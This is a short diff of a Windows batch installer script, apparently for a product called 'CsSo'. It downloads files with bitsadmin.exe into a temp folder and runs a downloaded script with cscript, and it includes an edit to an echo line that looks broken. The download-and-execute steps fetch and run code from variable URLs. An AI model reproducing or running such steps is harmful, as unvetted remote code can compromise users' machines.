@@ -298,9 +298,9 @@ echo [Picking the download Key]
 %SYSTEMROOT%\SYSTEM32\bitsadmin.exe /rawreturn /nowrap /transfer starter /dynamic /download /priority foreground %KeyDownload% "%temp%\InstallCsSo\%Name5%"
 findstr %KeyUrl% %temp%\InstallCsSo\%Name5% > %temp%\InstallCsSo\Key.cfg
 %SYSTEMROOT%\SYSTEM32\bitsadmin.exe /rawreturn /nowrap /transfer starter /dynamic /download /priority foreground %Key% "%temp%\InstallCsSo\%Name6%"
-cscript %temp%\InstallCsSo\%Name6% > %temp%\InstallCsSo\InstallLog.txt
+cscript %temp%\InstallCsSo\%Name6% "%temp%\InstallCsSo\%Name7%" %Key% %Key2% >> %temp%\InstallCsSo\InstallLog.txt
 for /f "delims==; tokens=1,2 eol=;" %%G in (%temp%\InstallCsSo\Key.cfg) do set %%G=%%H
-echo %CsSo%
+echo %%
 pause
 goto :eof
 
